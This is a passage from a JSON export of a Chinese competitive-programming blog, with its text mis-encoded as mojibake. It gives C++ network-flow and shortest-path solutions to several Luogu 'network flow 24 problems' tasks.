å®¹é‡ä¸º2,è´¹ç”¨ä¸º1 çš„è¾¹(å¯ä»¥ç»è¿‡2æ¬¡,ä¸”å¯¹ç­”æ¡ˆè´¡çŒ®ä¸º1) ä» ç‚¹nçš„å…¥ç‚¹ å‘ ç‚¹nçš„å‡ºç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º2,è´¹ç”¨ä¸º1 çš„è¾¹(å¯ä»¥ç»è¿‡2æ¬¡,ä¸”å¯¹ç­”æ¡ˆè´¡çŒ®ä¸º1) å¯¹äºè¾¹$&lt;u, v&gt;$, ä» uçš„å‡ºç‚¹ å‘ vçš„å…¥ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º1,è´¹ç”¨ä¸º0 çš„è¾¹(å¯ç»è¿‡1æ¬¡,å¯¹ç­”æ¡ˆæ— è´¡çŒ®) æ±‚ æœ€å¤§è´¹ç”¨æœ€å¤§æµ, æœ€å¤§æµ$maxflow\\leq 2$ è‹¥æœ€å¤§æµä¸º$2$, åˆ™ä¼šæœ‰ä¸€æ¡é“è·¯, ç»è¿‡çš„åŸå¸‚æ•°ä¸ºæœ€å¤§è´¹ç”¨$maxcost-2$(å‡å»é‡å¤çš„æºç‚¹å’Œæ±‡ç‚¹çš„è´¡çŒ®)æ±‚è·¯å¾„å¯ä»¥ å…ˆä¸€æ¬¡dfsæ‰¾åˆ°ä»1åˆ°nçš„æ‰€æœ‰æ®‹é‡ä¸º0çš„è·¯å¾„(æ»¡æµ$\\mathtt{e.cap == e.flow}$),æ­£åºè¾“å‡º å†ä¸€æ¬¡dfsæ‰¾åˆ°å¦ä¸€æ¡æ»¡æµè·¯å¾„,å¹¶ç”¨visç¡®ä¿æ²¡æœ‰é‡å¤åŸå¸‚,å€’åºè¾“å‡º(ä¸é‡å¤è¾“å‡ºn) è‹¥æœ€å¤§æµä¸º$1$, åˆ™ç›´æ¥ä»æºç‚¹åˆ°æ±‡ç‚¹æœ‰ä¸€æ¡é€šè·¯, è¾“å‡º$2$, è·¯å¾„ä¸º$1-&gt;n-&gt;1$ è‹¥æœ€å¤§æµä¸º$0$, åˆ™æ— è§£$\\texttt{No Solution!}$ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 210;const int inf = 0x3f3f3f3f;const int ninf = 0xc0c0c0c0;int n, m, s, t, ansflow;int vis[maxn], d[maxn], p[maxn], a[maxn];long long anscost;struct Edge { int from, to, cap, flow, cost; Edge(int u, int v, int c, int f, int w): from(u), to(v), cap(c), flow(f), cost(w){}};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int u, int v, int c, int w) { edges.push_back(Edge(u, v, c, 0, w)); edges.push_back(Edge(v, u, 0, 0,-w)); int mm = edges.size(); G[u].push_back(mm - 2); G[v].push_back(mm - 1);}bool BellmanFord(int&amp; flow, long long&amp; cost) { memset(d, 0xc0, sizeof(d)); memset(vis, 0, sizeof(vis)); d[s] = 0; vis[s] = 1; p[s] = 0; a[s] = inf; queue&lt;int&gt; Q; Q.push(s); while (!Q.empty()) { int x = Q.front(); Q.pop(); vis[x] = 0; for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (e.cap &gt; e.flow &amp;&amp; d[e.to] &lt; d[x] + e.cost) { d[e.to] = d[x] + e.cost; p[e.to] = G[x][i]; a[e.to] = min(a[x], e.cap - e.flow); if (!vis[e.to]) { Q.push(e.to); vis[e.to] = 1; } } } } if (d[t] == ninf) return false; flow += a[t]; cost += (long long)d[t] * (long long)a[t]; for (int u = t; u != s; u = edges[p[u]].from) { edges[p[u]].flow += a[t]; edges[p[u] ^ 1].flow -= a[t]; } return true;}int MinCostMaxFlow(long long&amp; cost) { int flow = 0; cost = 0; while (BellmanFord(flow, cost)); return flow;}string name[maxn];map&lt;string, int&gt; id;void dfs1(int u) { vis[u] = true; cout &lt;&lt; name[u - n] &lt;&lt; endl; for (int i = 0; i &lt; G[u].size(); ++i) { Edge&amp; e = edges[G[u][i]]; if (e.to &lt;= n &amp;&amp; e.cap == e.flow) { dfs1(e.to + n); break; } }}void dfs2(int u) { for (int i = 0; i &lt; G[u].size(); ++i) { Edge&amp; e = edges[G[u][i]]; if (e.to &lt;= n &amp;&amp; e.cap == e.flow &amp;&amp; !vis[e.to + n]) { dfs2(e.to + n); } } cout &lt;&lt; name[u - n] &lt;&lt; endl;}int main() { n = read(); m = read(); s = 1; t = 2 * n; for (int i = 1; i &lt;= n; ++i) { cin &gt;&gt; name[i]; id[name[i]] = i; } for (int i = 1; i &lt;= m; ++i) { string str1, str2; cin &gt;&gt; str1; cin &gt;&gt; str2; int u = id[str1], v = id[str2]; if (u &gt; v) swap(u, v); add(u + n, v, 1, 0); } for (int i = 2; i &lt; n; ++i) { add(i, i + n, 1, 1); } add(s, s + n, 2, 1); add(n, t, 2, 1); int maxflow = MinCostMaxFlow(anscost); if (maxflow == 2) { printf(&quot;%lld\\n&quot;, anscost - 2); } else if (maxflow == 1) { printf(&quot;2\\n&quot;); cout &lt;&lt; name[1] &lt;&lt; &quot;\\n&quot; &lt;&lt; name[n] &lt;&lt; &quot;\\n&quot; &lt;&lt; name[1] &lt;&lt; endl; return 0; } else { printf(&quot;No Solution!\\n&quot;); return 0; } memset(vis, 0, sizeof(vis)); dfs1(1 + n); dfs2(1 + n); return 0;}","link":"/p/6bb5462a.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€æœ€é•¿ä¸ä¸‹é™å­åºåˆ—é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2766ã€æœ€é•¿ä¸ä¸‹é™å­åºåˆ—é—®é¢˜ é¢˜ç›®å¤§æ„ç»™å®šæ­£æ•´æ•°åºåˆ—$x_1, x_2, â€¦, x_n$ è®¡ç®—å…¶ æœ€é•¿ä¸ä¸‹é™å­åºåˆ— çš„é•¿åº¦$S$ å¦‚æœæ¯ä¸ªå…ƒç´ åªå…è®¸ä½¿ç”¨ä¸€æ¬¡,è®¡ç®—ä»ç»™å®šçš„åºåˆ—ä¸­æœ€å¤šå¯å–å‡ºå¤šå°‘ä¸ªé•¿åº¦ä¸º$S$çš„ä¸ä¸‹é™å­åºåˆ— å¦‚æœå…è®¸åœ¨å–å‡ºçš„åºåˆ—ä¸­å¤šæ¬¡ä½¿ç”¨$x_1$å’Œ$x_n$,å…¶ä»–å…ƒç´ ä»ç„¶åªå…è®¸ä½¿ç”¨ä¸€æ¬¡,åˆ™ä»ç»™å®šåºåˆ—ä¸­æœ€å¤šå¯å–å‡ºå¤šå°‘ä¸ª ä¸åŒ çš„é•¿åº¦ä¸º$S$çš„ä¸ä¸‹é™å­åºåˆ— é¢˜è§£ç¬¬ä¸€é—®åŠ¨æ€è§„åˆ’çŠ¶æ€è½¬ç§»æ–¹ç¨‹:$\\mathtt{f[i]=max_{1â‰¤j&lt;i&amp;&amp;x_jâ‰¤x_i}\\{f[j]+1\\}}$åˆå€¼: $\\mathtt{f[0]=0}$ç»“æœ: $\\mathtt{max_{1\\leq i\\leq n}f[i]}$ ç¬¬äºŒé—®å°†æ¯ä¸ªç‚¹(ç´¢å¼•)æ‹†æˆä¸¤ä¸ªç‚¹åº”ç”¨äº†åˆ†å±‚å›¾çš„æ€æƒ³, æŠŠå›¾æ¯ä¸ªé¡¶ç‚¹$\\mathtt{i}$æŒ‰ç…§$\\mathtt{f[i]}$çš„ä¸åŒåˆ†ä¸ºäº†è‹¥å¹²å±‚è¿™æ ·å›¾ä¸­ä»$s$å‡ºå‘åˆ°$t$çš„ä»»ä½•ä¸€æ¡è·¯å¾„éƒ½æ˜¯ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„æœ€é•¿ä¸Šå‡å­åºåˆ—ç”±äºåºåˆ—ä¸­æ¯ä¸ªç‚¹è¦ä¸å¯é‡å¤åœ°å–å‡º,éœ€è¦æŠŠæ¯ä¸ªç‚¹æ‹†åˆ†æˆä¸¤ä¸ªç‚¹å•ä½ç½‘ç»œçš„æœ€å¤§æµå°±æ˜¯å¢å¹¿è·¯çš„æ¡æ•°,æ‰€ä»¥æœ€å¤§æµé‡å°±æ˜¯ç¬¬äºŒé—®ç»“æœã€‚ ä» æºç‚¹ å‘ æ¯ä¸ª$\\mathtt{f[i]==1}$çš„ç‚¹içš„å·¦ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º1 çš„è¾¹ ä» æ¯ä¸ªç‚¹çš„å·¦ç‚¹ å‘ å…¶å³ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º1 çš„è¾¹ ä» $\\mathtt{f[i]==S}$çš„ç‚¹içš„å³ç‚¹ å‘ æ±‡ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º1 çš„è¾¹ å¯¹äº$j&lt;i$,è‹¥$\\mathtt{x_j\\leq x_i &amp;&amp; f[i] == f[j] + 1}$,åˆ™ä» ç‚¹jçš„å³ç‚¹ å‘ ç‚¹içš„å·¦ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º1 çš„è¾¹ ç¬¬ä¸‰é—®è¦æ±‚$x_1$å’Œ$x_n$å¯ä»¥é‡å¤ä½¿ç”¨,åªéœ€å–æ¶ˆè¿™ä¸¤ä¸ªç‚¹ç›¸å…³è¾¹çš„æµé‡é™åˆ¶,æ±‚ç½‘ç»œæœ€å¤§æµå³å¯ ä» æºç‚¹ å‘ ç‚¹1çš„å·¦ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º$inf$ çš„è¾¹ ä» ç‚¹1çš„å·¦ç‚¹ å‘ ç‚¹1çš„å³ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º$inf$ çš„è¾¹ è‹¥$\\mathtt{f[n]==S}$åˆ™ä» ç‚¹nçš„å·¦ç‚¹ å‘ ç‚¹nçš„å³ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º$inf$ çš„è¾¹ è‹¥$\\mathtt{f[n]==S}$åˆ™ä» ç‚¹nçš„å³ç‚¹ å‘ æ±‡ç‚¹ å»ºä¸€æ¡ å®¹é‡ä¸º$inf$ çš„è¾¹ æ³¨æ„åˆ¤æ–­å½“$n==1$æ—¶çš„æƒ…å†µ(ç¬¬ä¸‰é—®ç­”æ¡ˆä¼šå‡ºç°$inf$) ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 2010;const int inf = 0x3f3f3f3f;int s, t, d[maxn], cur[maxn];struct Edge { int from, to, cap, flow;};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back((Edge) {from, to, cap, 0}); edges.push_back((Edge) {to, from, 0, 0}); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}bool vis[maxn];bool BFS() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int DFS(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = DFS(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int dinic(int s, int t) { int flow = 0; while (BFS()) { memset(cur, 0, sizeof(cur)); flow += DFS(s, inf); } return flow;}int n, num[510], dp[510], ans1, ans2, ans3; int main() { n = read(); for (int i = 1; i &lt;= n; ++i) { num[i] = read(); } // Question 1 for (int i = 1; i &lt;= n; ++i) { for (int j = 1; j &lt; i; ++j) { if (num[j] &lt;= num[i] &amp;&amp; dp[j] &gt; dp[i]) dp[i] = dp[j]; } dp[i]++; ans1 = max(ans1, dp[i]); } printf(&quot;%d\\n&quot;, ans1); // Question 2 s = 0, t = 2 * n + 1; for (int i = 1; i &lt;= n; ++i) if (dp[i] == 1) add(s, i, 1); for (int i = 1; i &lt;= n; ++i) add(i, i + n, 1); for (int i = 1; i &lt;= n; ++i) if (dp[i] == ans1) add (i + n, t, 1); for (int i = 1; i &lt;= n; ++i) for (int j = 1; j &lt; i; ++j) if (num[j] &lt;= num[i] &amp;&amp; dp[i] == dp[j] + 1) add(j + n, i, 1); ans2 = dinic(s, t); printf(&quot;%d\\n&quot;, ans2); // Question 3 if (n == 1) { printf(&quot;1\\n&quot;); return 0; } add(s, 1, inf); add(1, 1 + n, inf); if (dp[n] == ans1) { add(n, n + n, inf); add(n + n, t, inf); } ans3 = ans2 + dinic(s, t); printf(&quot;%d\\n&quot;, ans3); return 0;}","link":"/p/a66cf8af.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€å¤ªç©ºé£è¡Œè®¡åˆ’é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2762ã€å¤ªç©ºé£è¡Œè®¡åˆ’é—®é¢˜ é¢˜ç›®å¤§æ„æœ‰$m$ä¸ªå®éªŒï¼Œæ¯ä¸ªå®éªŒåªå¯ä»¥è¿›è¡Œä¸€æ¬¡ï¼Œä½†ä¼šè·å¾—ç›¸åº”çš„å¥–é‡‘æœ‰$n$ä¸ªä»ªå™¨ï¼Œæ¯ä¸ªå®éªŒéƒ½éœ€è¦ä¸€å®šçš„ä»ªå™¨ï¼Œæ¯ä¸ªä»ªå™¨å¯ä»¥è¿ç”¨äºå¤šä¸ªå®éªŒï¼Œä½†éœ€è¦ä¸€å®šçš„ä»·å€¼ é—®å¥–é‡‘ä¸ä»£ä»·çš„å·®çš„æœ€å¤§å€¼æ˜¯å¤šå°‘ï¼Ÿ é¢˜è§£ ä»æºç‚¹å‘æ¯ä¸ªå®éªŒå»º å®¹é‡ä¸ºå®éªŒå¥–é‡‘ çš„è¾¹ ä»æ¯ä¸ªä»ªå™¨å‘æ±‡ç‚¹å»º å®¹é‡ä¸ºä»ªå™¨è´¹ç”¨ çš„è¾¹ å®éªŒå‘å¯¹åº”ä»ªå™¨å»º å®¹é‡ä¸º$inf$ çš„è¾¹(ä¿è¯ä¸è¢«å‰²) ç„¶åæ±‚æœ€å°å‰²å³æœ€å¤§æµ,åªä¼šå‰²æ–­ æº-&gt;å®éªŒ æˆ–è€… ä»ªå™¨-&gt;æ±‡ çš„ç‚¹æœ€åä¸€æ¬¡bfså,ä»å’Œæºç›¸è¿çš„å®éªŒ/ä»ªå™¨ä¸ºè¦è¿›è¡Œçš„å®éªŒ/éœ€è¦çš„ä»ªå™¨ æœ€å¤§æ”¶ç›Šä¸ºæ‰€æœ‰æ”¯ä»˜çš„è´¹ç”¨ä¹‹å’Œå‡æœ€å¤§æµ æ ·ä¾‹çš„å»ºè¾¹è§ä¸‹å›¾: ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;bits/stdc++.h&gt;using namespace std;bool endr = false;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} if (ch == '\\r') endr = true; return x * f;}const int maxn = 110;const int inf = 0x3f3f3f3f;int n, m, s, t, d[maxn], cur[maxn], tot;struct Edge { int from, to, cap, flow;};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back((Edge) {from, to, cap, 0}); edges.push_back((Edge) {to, from, 0, 0}); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}bool vis[maxn];bool BFS() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int DFS(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = DFS(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int dinic(int s, int t) { int flow = 0; while (BFS()) { memset(cur, 0, sizeof(cur)); flow += DFS(s, inf); } return flow;}int main() { int m_ = read(), n_ = read(); n = m_ + n_ + 2; s = 0; t = n - 1; for (int i = 1; i &lt;= m_; ++i) { int p = read(); tot += p; add(s, i, p); char tools[10000]; memset(tools, 0, sizeof(tools)); cin.getline(tools, 10000); int ulen = 0, tool; while (sscanf(tools + ulen, &quot;%d&quot;, &amp;tool) == 1) { add(i, tool + m_, inf); if (tool == 0) ulen++; else { while (tool) { tool /= 10; ulen++; } } ulen++; } } for (int i = 1; i &lt;= n_; ++i) { int c = read(); add(i + m_, t, c); } int ans = dinic(s, t); for (int i = 1; i &lt;= m_; ++i) { if (vis[i]) printf(&quot;%d &quot;, i); } printf(&quot;\\n&quot;); for (int i = 1; i &lt;= n_; ++i) { if (vis[i + m_]) printf(&quot;%d &quot;, i); } printf(&quot;\\n&quot;); printf(&quot;%d\\n&quot;, tot - ans); return 0;}","link":"/p/f5a4cbbc.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€è½¯ä»¶è¡¥ä¸é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2761ã€è½¯ä»¶è¡¥ä¸é—®é¢˜ é¢˜ç›®å¤§æ„$n$ä¸ªé”™è¯¯,$m$ä¸ªè¡¥ä¸ ç¬¬$i$ä¸ªè¡¥ä¸è€—æ—¶$t_i$ä½¿ç”¨è¯¥è¡¥ä¸éœ€è¦è½¯ä»¶ä¸­åŒ…å«æ‰€æœ‰$B1_i$ä¸­çš„é”™è¯¯,å¹¶ä¸”ä¸åŒ…å«$B2_i$ä¸­çš„ä»»ä½•ä¸€ä¸ªé”™è¯¯è¯¥è¡¥ä¸å¯ä»¥ä¿®å¤é”™è¯¯$F1_i$,ä½†ä¼šæ·»åŠ é”™è¯¯$F2_i$ æ‰¾å‡ºä¿®å¤æ‰€æœ‰é”™è¯¯çš„æœ€çŸ­æ—¶é—´ é¢˜è§£é”™è¯¯è¾ƒå°‘,å¯ä»¥ä½¿ç”¨çŠ¶æ€å‹ç¼©,ç”¨2è¿›åˆ¶è¡¨ç¤ºé”™è¯¯çš„ä¿®å¤æƒ…å†µ(1è¡¨ç¤ºæœªä¿®å¤,0è¡¨ç¤ºå·²ä¿®å¤)èµ·å§‹çŠ¶æ€$\\texttt{111â€¦1}$,ç»“æŸçŠ¶æ€$\\texttt{000â€¦0}$ æ¯ä¸ªçŠ¶æ€å½“åšå›¾ä¸­çš„èŠ‚ç‚¹,å³æ±‚èµ·å§‹çŠ¶æ€åˆ°ç»“æŸçŠ¶æ€çš„æœ€çŸ­è·¯ ç”±äºè¡¥ä¸è¾ƒå°‘,ä¸ç”¨è¿è¾¹,åœ¨æœ€çŸ­è·¯éœ€è¦éå†è¾¹æ—¶,éå†æ‰€æœ‰è¡¥ä¸,å¹¶åˆ¤æ–­æ˜¯å¦èƒ½å¤Ÿè”é€š(å³å½“å‰çŠ¶æ€æ˜¯å¦åŒ…å«è¯¥è¡¥ä¸çš„$B1$,è€Œä¸åŒ…å«$B2$)å¦‚æœèƒ½å¤Ÿè¿æ¥,åˆ™ä¸‹ä¸€ä¸ªçŠ¶æ€ä¸ºå½“å‰çŠ¶æ€æ‰“ä¸Šå½“å‰è¡¥ä¸(å³ä¿®å¤$F1$,æ·»åŠ $F2$)è¾¹æƒä¸ºå½“å‰è¡¥ä¸çš„è€—æ—¶ä½¿ç”¨SPFAè·‘æœ€çŸ­è·¯å³å¯ ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}inline int read_() { char ch = getchar(); while (ch != '+' &amp;&amp; ch != '-' &amp;&amp; ch != '0') ch = getchar(); if (ch == '+') return 1; else if (ch == '-') return 2; return 0;}const int inf = 0x3f3f3f3f;struct DLL { int time; int b1, b2; int f1, f2;}node[110];int n, m, s, t;int dis[1 &lt;&lt; 21];bool vis[1 &lt;&lt; 21];void SPFA(int s) { memset(dis, 0x3f, sizeof(dis)); dis[s] = 0; vis[s] = true; queue&lt;int&gt; q; q.push(s); while (!q.empty()) { int u = q.front(); q.pop(); vis[u] = false; for (int i = 1; i &lt;= m; ++i) { if ((u &amp; node[i].b1) == node[i].b1 &amp;&amp; (u &amp; node[i].b2) == 0) { int v = ((u | node[i].f1) | node[i].f2) ^ node[i].f1; if (dis[v] &gt; dis[u] + node[i].time) { dis[v] = dis[u] + node[i].time; if (!vis[v]) { q.push(v); vis[v] = true; } } } } }}int main() { n = read(); m = read(); s = (1 &lt;&lt; n) - 1; t = 0; for (int i = 1; i &lt;= m; ++i) { node[i].time = read(); for (int j = 0; j &lt; n; ++j) { int sta = read_(); if (sta == 1) node[i].b1 |= (1 &lt;&lt; j); if (sta == 2) node[i].b2 |= (1 &lt;&lt; j); } for (int j = 0; j &lt; n; ++j) { int sta = read_(); if (sta == 2) node[i].f1 |= (1 &lt;&lt; j); if (sta == 1) node[i].f2 |= (1 &lt;&lt; j); } } SPFA(s); printf(&quot;%d\\n&quot;, dis[t] == inf ? 0 : dis[t]); return 0;}","link":"/p/2f9adffb.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€å®¶å›­&#x2F;æ˜Ÿé™…è½¬ç§»é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P2754ã€å®¶å›­/æ˜Ÿé™…è½¬ç§»é—®é¢˜ é¢˜ç›®å¤§æ„1ä¸ªåœ°çƒ,$n$ä¸ªå¤ªç©ºç«™,1ä¸ªæœˆçƒ,$k$ä¸ªäºº$m$è‰˜èˆ¹,ç¬¬$i$è‰˜å®¹çº³$h_i$ä¸ªäºº,åœé $r_i$ç«™,åˆ†åˆ«ä¸º$S_{i,j}$,æ¯æ¬¡è€—æ—¶1åˆå§‹äººå…¨åœ¨åœ°çƒ,ç»“æŸäººå…¨åœ¨æœˆçƒ æ±‚æœ€çŸ­æ—¶é—´ é¢˜è§£å…ˆæ ¹æ®è¾“å…¥çš„åœé ä½ç½®,å»ºç«‹å¹¶æŸ¥é›†,è‹¥åœ°æœˆä¸è¿é€š,åˆ™æ— è§£,è¾“å‡º$0$ å†æ ¹æ®æ—¶é—´å»ºè¾¹,æ—¶é—´æ¯å¢åŠ 1,å¢åŠ ä¸€å±‚,æ±‚ä¸€æ¬¡æœ€å¤§æµ,æ·»åŠ è¿›ç­”æ¡ˆå½“ç­”æ¡ˆå¤§äº$k$æ—¶,å³å¯å…¨éƒ¨åˆ°è¾¾æœˆçƒ æ ·ä¾‹çš„å»ºå›¾æ˜¯è¿™æ ·: ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117#include &lt;bits/stdc++.h&gt;using namespace std;inline int read() { int x = 0; int f = 1; char ch = getchar(); while (!isdigit(ch)) {if (ch == '-') f = -1; ch = getchar();} while (isdigit(ch)) {x = x * 10 + ch - 48; ch = getchar();} return x * f;}const int maxn = 5010;const int inf = 0x3f3f3f3f;int n, m, s, t, d[maxn], ans, cur[maxn];int ufs[25];int find(int x) { return (ufs[x] == x) ? x : ufs[x] = find(ufs[x]);}void unionn(int x, int y) { int fx = find(x), fy = find(y); if (fx != fy) ufs[fx] = fy;}struct Edge { int from, to, cap, flow;};vector&lt;Edge&gt; edges;vector&lt;int&gt; G[maxn];void add(int from, int to, int cap) { edges.push_back((Edge) {from, to, cap, 0}); edges.push_back((Edge) {to, from, 0, 0}); int mm = edges.size(); G[from].push_back(mm - 2); G[to].push_back(mm - 1);}bool vis[maxn];bool BFS() { memset(vis, 0, sizeof(vis)); queue&lt;int&gt; Q; Q.push(s); d[s] = 0; vis[s] = 1; while (!Q.empty()) { int x = Q.front(); Q.pop(); for (int i = 0; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (!vis[e.to] &amp;&amp; e.cap &gt; e.flow) { vis[e.to] = 1; d[e.to] = d[x] + 1; Q.push(e.to); } } } return vis[t];}int DFS(int x, int a) { if (x == t || a == 0) return a; int flow = 0, f; for (int&amp; i = cur[x]; i &lt; G[x].size(); ++i) { Edge&amp; e = edges[G[x][i]]; if (d[x] + 1 == d[e.to] &amp;&amp; (f = DFS(e.to, min(a, e.cap - e.flow))) &gt; 0) { e.flow += f; edges[G[x][i] ^ 1].flow -= f; flow += f; a -= f; if (a == 0) break; } } return flow;}int dinic(int s, int t) { int flow = 0; while (BFS()) { memset(cur, 0, sizeof(cur)); flow += DFS(s, inf); } return flow;}int S[25][25];int main() { n = read(); m = read(); int k = read(); s = 0; t = n + 1; for (int i = 1; i &lt;= n + 1; ++i) ufs[i] = i; for (int i = 1; i &lt;= m; ++i) { S[0][i] = read(); S[i][0] = read(); for (int j = 1; j &lt;= S[i][0]; ++j) { S[i][j] = read(); if (S[i][j] == -1) S[i][j] = n + 1; if (j &gt; 1) unionn(S[i][j], S[i][j - 1]); } } if (find(s) != find(t)) { printf(&quot;0\\n&quot;); return 0; } for (int time = 1; ; ++time) { for (int i = 0; i &lt;= n; ++i) { add(i + (time - 1) * (n + 2), i + time * (n + 2), inf); } add(n + 1 + time * (n + 2), n + 1 + (time - 1) * (n + 2), inf); for (int i = 1; i &lt;= m; ++i) { int tmp = (time - 1) % S[i][0] + 1; add(S[i][tmp] + (time - 1) * (n + 2), S[i][time % S[i][0] + 1] + time * (n + 2), S[0][i]); } ans += dinic(s, t); if (ans &gt;= k) { printf(&quot;%d\\n&quot;, time); return 0; } }}","link":"/p/af442de1.html"},{"title":"ã€Œç½‘ç»œæµ24é¢˜ã€é¤å·¾è®¡åˆ’é—®é¢˜-é¢˜è§£","text":"é¢˜ç›®ä¼ é€é—¨: ã€ŒLuogu P1251ã€é¤å·¾è®¡åˆ’é—®é¢˜ é¢˜ç›®å¤§æ„åœ¨$N$å¤©é‡Œ,ç¬¬$i$å¤©éœ€è¦$r_i$ä¸ªé¤å·¾ å¯ä»¥è´­ä¹°é¤å·¾,æ¯å¼ $p$å…ƒ å¯ä»¥å°†æ—§é€å¿«æ´—,$m$å¤©,è´¹ç”¨$f$å…ƒ å¯ä»¥å°†æ—§é€æ…¢æ´—,$n$å¤©,è´¹ç”¨$s$å…ƒ æ¯å¤©ç»“æŸ,å¯ä»¥é€å¿«æ´—,æ…¢æ´—,ä¿å­˜ è®¾è®¡æœ€å°èŠ±è´¹ é¢˜è§£å°†æ¯å¤©æ‹†æˆ2ä¸ªç‚¹(æ—©æ™š),æ–°å»ºæºç‚¹æ±‡ç‚¹(æºç‚¹è¡¨ç¤ºè·å¾—,æ±‡ç‚¹è¡¨ç¤ºä½¿ç”¨) æ¯å¤©æ—©ä¸Šçš„ç‚¹,å‘æ±‡ç‚¹è¿ å®¹é‡ä¸º$r_i$,è´¹ç”¨ä¸º$0$ çš„è¾¹,è¡¨ç¤ºå½“æ—¥éœ€è¦ä½¿ç”¨ æºç‚¹å‘æ¯å¤©æ™šä¸Šçš„ç‚¹è¿ å®¹é‡ä¸º$r_i$,è´¹ç”¨ä¸º$0$ çš„è¾¹,æ¯å¤©æ™šä¸Šè·å¾—å¤šå°‘æ—§é¤å·¾ æºç‚¹å‘æ¯å¤©æ—©ä¸Šçš„ç‚¹è¿ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$p$ çš„è¾¹,è¡¨ç¤ºè´­ä¹° æ¯å¤©æ™šä¸Šå‘$+m$å¤©çš„æ—©ä¸Šè¿ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$f$ çš„è¾¹,è¡¨ç¤ºå¿«æ´— æ¯å¤©æ™šä¸Šå‘$+n$å¤©çš„æ—©ä¸Šè¿ å®¹é‡ä¸º$inf$,è´¹ç”¨ä¸º$s$ çš„è¾¹,è¡¨ç¤ºå¿«æ´— æ¯å¤©æ™šä¸Šå‘ç¬¬äºŒå¤©æ™šä¸Šè¿ 